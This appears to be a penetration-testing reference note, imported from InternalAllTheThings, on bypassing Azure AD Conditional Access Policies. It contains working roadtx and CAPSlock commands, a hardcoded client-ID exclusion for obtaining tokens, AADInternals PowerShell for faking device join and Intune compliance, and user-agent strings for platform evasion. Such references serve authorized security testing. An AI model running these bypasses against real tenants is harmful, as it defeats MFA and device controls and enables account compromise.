---
title: Azure AD - Conditional Access Policy
type: technique
tags: [active-directory, azure, bypass, cloud, evasion, reference-import]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Azure AD - Conditional Access Policy

## What it is

Conditional Access is used to restrict access to resources to compliant devices only.

## How it works

Conditional Access Policies (CAPs) enforce requirements such as MFA, compliant device, and IP location conditions before granting access to Azure AD-protected resources. Attackers bypass CAPs by identifying gaps: legacy authentication protocols (POP, IMAP, SMTP) are often excluded from MFA policies; switching the User-Agent string to impersonate an excluded platform (such as Android or Linux) can satisfy platform-based conditions; and enrollment in a personal device via Azure AD Join can satisfy device-compliance requirements. Tools like ROADrecon and FindMeAccess automate CAP enumeration to find the least-restricted authentication path.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

Conditional Access is used to restrict access to resources to compliant devices only.

* [rbnroot/CAPSlock](https://github.com/rbnroot/CAPSlock) - Offline Conditional Access (CA) analysis tool built on top of a roadrecon database.
* [absolomb/FindMeAccess](https://github.com/absolomb/FindMeAccess) - Tool for finding gaps in Azure/M365 MFA requirements for different resources, client ids, and user agents.

## Enumerate Conditional Access Policies

* Enumerate Conditional Access Policies: `roadrecon plugin policies` (query the local database)

| CAP                       | Bypass  |
|---------------------------|---------|
| Location / IP ranges      | Corporate VPN, Guest Wifi |
| Platform requirement      | User-Agent switcher (Android, PS4, Linux, ...) |
| Protocol requirement      | Use another protocol (e.g for e-mail acccess:  POP, IMAP, SMTP) |
| Azure AD Joined Device    | Try to join a VM (Work Access)|
| Compliant Device (Intune) | Fake device compliance |
| Device requirement        | / |
| MFA                       | / |
| Legacy Protocols          | / |
| Domain Joined             | / |

```ps1
python3 CAPSlock.py analyze -u <userprincipalname> --resource <resource-id> [options]
python3 CAPSlock.py what-if -u <userprincipalname> --resource <resource-id> [options]
python3 CAPSlock.py web-gui --port 8080
```

## Bypassing CAP by faking device compliance

### Intune Company Portal Client ID Bypass

Use Intune Company Portal Client ID (`9ba1a5c7-f17a-4de9-a1f1-6178c8d51223`), to run `roadrecon` even when there is a device compliance policy. it is a hardcoded and undocumented exclusion in Conditional Access for device compliance and has the `user_impersonation` rights on the AAD Graph.

* Client ID: `9ba1a5c7-f17a-4de9-a1f1-6178c8d51223`

```ps1
roadtx gettokens -u $username -p $password -r msgraph -ua $windows_ua -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 # limite scope
roadtx gettokens -u $username -p $password -r aadgraph -ua $windows_ua -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 # user_impersonation scope
```

### AAD Internals - Making your device compliant

```powershell
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache

# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"

# Marking device compliant - option 1: Registering device to Intune
# Get an access token for Intune MDM and save to cache (prompts for credentials)
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 

# Join the device to Intune
Join-AADIntDeviceToIntune -DeviceName "SixByFour"

# Start the call back
Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
```

## Bypassing CAP with device.trustType

The trustType property is an internal attribute that defines the relationship between the device and Azure AD.
When the condition of CAP is `device.trustType -eq "<TYPE>"`, the values can be:

* `AzureAD`: Azure AD joined devices
* `Workplace`: Azure AD registered devices
* `ServerAD`: Hybrid joined devices

## Bypassing CAP with user agent

There are several devices you can use to authenticate and interact with a service.
Try several `User-Agent` to get access to the resources:

* Windows: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100`
* Linux: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 uacq`
* macOS: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 uacq`
* Android: `Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36`
* iOS: `Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.85 Mobile/15E148 Safari/604.1`
* WindowsPhone: `Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Safari/537.36`

## Bypassing CAP with location

Try different IP locations using a VPN.

## References

* [Conditional Access bypasses - Fabian Bader - November 30, 2025](https://cloudbrothers.info/en/conditional-access-bypasses/)
* [Finding Entra ID CA Bypasses - the structured way - Dirk-jan Mollema and Fabian Bader - June 23, 2025](https://troopers.de/troopers25/talks/tfsfqs/)
* [STOP THE CAP: Making Entra ID Conditional Access Make Sense Offline - Lee Robinson - February 17, 2026](https://specterops.io/blog/2026/02/17/stop-the-cap-making-entra-id-conditional-access-make-sense-offline/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[roadtools]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
